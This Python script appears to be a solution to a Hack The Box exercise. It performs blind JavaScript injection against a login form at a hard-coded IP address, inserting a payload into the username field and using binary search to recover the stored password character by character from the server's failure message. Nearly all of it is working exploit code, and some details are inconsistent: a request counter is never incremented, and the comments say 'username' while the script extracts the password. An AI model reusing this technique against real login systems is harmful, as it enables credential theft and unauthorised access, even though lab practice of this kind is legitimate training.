#!/usr/bin/python3
import string
import requests
import json
from urllib.parse import quote

def send_request(t):
    proxies = {
        'http': 'http://localhost:8080',
        'https': 'http://localhost:8080'
    }

    burp0_url = "http://94.237.62.198:58967/login"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://94.237.62.198:58967", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://94.237.62.198:58967/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_data = 'username=a"%3breturn+('+quote(str(t))+')%3b+var+xyz%3d"a&password=e'
    print(burp0_data)
    return requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies)

def make_guess(payload):
    r_text = send_request(payload).text
#    print(r_text)
    if "Log in failed with the given credentials." in r_text:
        return True
    else:
        return False

# Dump the username (binary search)
num_req = 0 # Reset the request counter
username = "" # Known beginning of username
i = 0 # Skip the first 4 characters (HTB{)
count_0 = 0
extraction_parameter = "password"
while count_0 < 10: # Repeat until we meet '}' aka end of username
    low = 32 # Set low value of search area (' ')
    high = 127 # Set high value of search area ('~')
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Caluclate the midpoint of the search area
        if make_guess('this.%s.charCodeAt(%d) > %d' % (extraction_parameter, i, mid)):
            low = mid + 1 # If ASCII value of username at index 'i' < midpoint, increase the lower boundary and repeat
        elif make_guess('this.%s.charCodeAt(%d) < %d' % (extraction_parameter, i, mid)):
            high = mid - 1 # If ASCII value of username at index 'i' > midpoint, decrease the upper boundary and repeat
        else:
            username += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
            print(username)
            if chr(mid) == "0":
                count_0+=1
            break # Break out of the loop
    i += 1 # Increment the index counter (start work on the next character)
username = username.rstrip("0000000000")
assert (make_guess('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
